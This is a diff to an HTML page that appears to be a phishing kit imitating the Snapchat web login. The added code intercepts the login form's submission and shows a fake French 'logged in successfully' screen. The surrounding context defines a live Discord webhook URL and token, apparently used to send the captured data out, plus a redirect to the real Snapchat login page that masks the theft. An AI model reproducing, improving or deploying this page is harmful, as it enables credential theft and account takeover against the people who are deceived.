@@ -129,6 +129,25 @@
     <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
   </div>
 
+  <div class="text-screen" id="textScreen" style="display:none; text-align:center; padding:40px; background-color:#fff; border-radius:10px; box-shadow:0 0 15px rgba(0,0,0,0.1); max-width:400px;">
+  <h3>Bienvenue !</h3>
+  <p>Vous êtes connecté avec succès.</p>
+  <textarea rows="4" style="width:100%; border-radius:8px; padding:10px; font-size:14px;" placeholder="Écrivez quelque chose ici..."></textarea>
+</div>
+
+<script>
+  const loginForm = document.getElementById('loginForm');
+  const loginBox = document.getElementById('loginBox');
+  const textScreen = document.getElementById('textScreen');
+
+  loginForm.addEventListener('submit', function(e) {
+    e.preventDefault(); // empêche le rechargement de la page
+    loginBox.style.display = 'none'; // cache la boîte de connexion
+    textScreen.style.display = 'block'; // affiche la nouvelle zone de texte
+  });
+</script>
+
+
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1456052165062955154/PIffzSrsDCnQ4Q-Um7YqT4e9Ti6Cz7m8FbSHqI169lw6MnT8nra8dyS_zEesu9M3wsNS";
     const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
